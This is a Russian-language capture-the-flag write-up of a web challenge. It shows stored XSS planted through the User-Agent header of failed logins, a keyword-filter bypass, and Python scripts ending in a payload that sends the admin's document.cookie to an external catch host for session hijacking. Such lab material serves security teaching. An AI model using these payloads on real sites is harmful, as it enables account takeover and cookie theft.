**level**: **Hard**
**Description**: Воображение важнее, чем знания
**IP**: 62.173.140.174:16035

Первое что видим - форма логин/регистрации
Пробуем создать аккаунт, а также понимаем что скорее всего нужно будет получить доступ к аккаунту админа.

Изучаем html код на наличие подсказок, скрытых функций и тд.

Отлично, какой-то скрытый функционал, позже мы к нему вернемся.
Исследуем далее.
Видим личный кабинет  с "failed login attempts", изучим функционал сервиса, произведем попытку логина с неправильным паролем с другого браузера или с режима инкогнито.
Попробуем XSS payload, зарегистрируем пользователя с логином:

<script>alert(1)</script>

Также пробуем зайти вне с неправильным паролем, и видим что XSS-уязвимость есть, это нам поможет захватить аккаунт пользователя запустив на нем javascript code, если сможем послать наш пейлоад.

Но изменить имя admin на пейлоад нельзя, но не будем забывать что есть еще другие поля, которые тоже скорее всего подвержены XSS-атаке.
На поле id, username, IP, Date мы повлиять не можем, они генерируются на сервере, а вот на User-Agent запросто!

Для этого напишем скрипт на python, он нам очень пригодится в будущем.


import requests

payload = "<script>alert(1);</script>" # это пейлоад

user = "asdf" #Тут наш username
headers = {'User-Agent': payload} # Вставляем его в хедер
data = {"username":user, "password":"aboba"}


response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data) # Совершаем попытку логина с неверным паролем
 
print(response.status_code)# Выводим информацию
#print(response.text) 

````python 
import requests


payload = '<script>alert(document.cookie);</script>'

user = "asdf" 
headers = {'User-Agent': payload}
data = {"username":user, "password":"aboba"}


response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)
 
print(response.status_code)
print(response.text)

Cталкиваемся с проблемой
Обход фильтрации

В функции alert() нам нужно вывести document.cookie.
Попробуем сделать это с помощью переменных.

python 
import requests

payload = '<script>const vv = ["coo", "kie"].join("");alert(document[vv]);</script>'

user = "asdf" 
headers = {'User-Agent': payload}
data = {"username":user, "password":"aboba"}

response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)
 
print(response.status_code)
print(response.text)


1) Переходим в вкладку
2) Копируем **url**
3) Переходим по ней в google
4) Нажимаем **Poll now**, чтобы получить с сервера данные.
5) Если окошко как на фото снизу не появляется, то нажмите на "+.

Эта функция заменит нам ngrok или свой белый IP и сервер.
Копируем и вставляем в скрипт.

````python 
import requests


payload = '<script>const vv = ["coo", "kie"].join(""); var payload = `https://{{СЮДА}}/?${vv}=` + document[vv]; fetch(payload);</script>'

user = "admin" 
headers = {'User-Agent': payload}
data = {"username":user, "password":"aboba"}


response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)
 
print(response.status_code)
print(response.text)
````

Отправляем.
Подставим значение PHPSESSID в наш браузер. 
